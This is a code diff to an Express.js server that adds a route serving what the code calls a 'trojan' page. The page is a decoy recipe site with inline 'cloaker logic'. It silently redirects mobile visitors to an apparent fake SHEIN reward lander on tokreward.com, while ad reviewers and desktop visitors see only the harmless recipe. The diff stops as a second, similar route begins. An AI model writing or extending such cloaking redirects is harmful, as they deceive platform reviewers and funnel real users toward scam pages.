@@ -17,6 +17,128 @@ app.use(express.static(path.join(__dirname, 'public')));
 // ALEXI 5.0
 
 // SHEIN BH FLUENT
+app.get('/94712/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=947`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    height: 100%;
+                    font-family: 'Arial', sans-serif;
+                    background-color: #f0f8ff;
+                    color: #333;
+                }
+                .wrapper {
+                    display: flex;
+                    flex-direction: column;
+                    min-height: 100vh;
+                }
+                header {
+                    background-color: #4a90e2;
+                    color: white;
+                    padding: 1em;
+                    text-align: center;
+                }
+                .main-content {
+                    flex: 1;
+                    padding: 2em;
+                    max-width: 800px;
+                    margin: 0 auto;
+                }
+                .recipe-card {
+                    background-color: white;
+                    border-radius: 10px;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                    padding: 1.5em;
+                    margin-bottom: 2em;
+                }
+                .recipe-card h2 {
+                    color: #4a90e2;
+                }
+                .ingredients, .instructions {
+                    margin-top: 1em;
+                }
+                .ingredients ul, .instructions ol {
+                    padding-left: 1.5em;
+                }
+                footer {
+                    background-color: #333;
+                    color: white;
+                    text-align: center;
+                    padding: 1em;
+                }
+                footer a {
+                    color: #4a90e2;
+                    text-decoration: none;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="wrapper">
+                <header>
+                    <h1>${slug}'s Culinary Corner</h1>
+                </header>
+                <main class="main-content">
+                    <div class="recipe-card">
+                        <h2>${slug}'s Signature Dish</h2>
+                        <p>Discover the mouthwatering flavors of ${slug}'s kitchen with this exquisite recipe.</p>
+                        <div class="ingredients">
+                            <h3>Ingredients:</h3>
+                            <ul>
+                                <li>2 cups of ${slug}'s secret spice blend</li>
+                                <li>1 pound of fresh, locally-sourced vegetables</li>
+                                <li>4 tablespoons of extra virgin olive oil</li>
+                                <li>1 cup of ${slug}'s homemade broth</li>
+                                <li>Salt and pepper to taste</li>
+                            </ul>
+                        </div>
+                        <div class="instructions">
+                            <h3>Instructions:</h3>
+                            <ol>
+                                <li>Preheat your oven to 375°F (190°C).</li>
+                                <li>Wash and chop the vegetables into bite-sized pieces.</li>
+                                <li>In a large bowl, toss the vegetables with ${slug}'s secret spice blend and olive oil.</li>
+                                <li>Spread the seasoned vegetables on a baking sheet.</li>
+                                <li>Roast in the oven for 25-30 minutes, stirring halfway through.</li>
+                                <li>In a saucepan, heat ${slug}'s homemade broth.</li>
+                                <li>Combine the roasted vegetables with the hot broth.</li>
+                                <li>Season with salt and pepper to taste.</li>
+                                <li>Serve hot and enjoy ${slug}'s culinary masterpiece!</li>
+                            </ol>
+                        </div>
+                    </div>
+                </main>
+                <footer>
+                    <p>Savor the flavors of ${slug} &copy; 2024 ${slug}'s Culinary Corner | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+                </footer>
+            </div>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 947 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
 app.get('/87611/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/sheinesp.html?slug=876`;
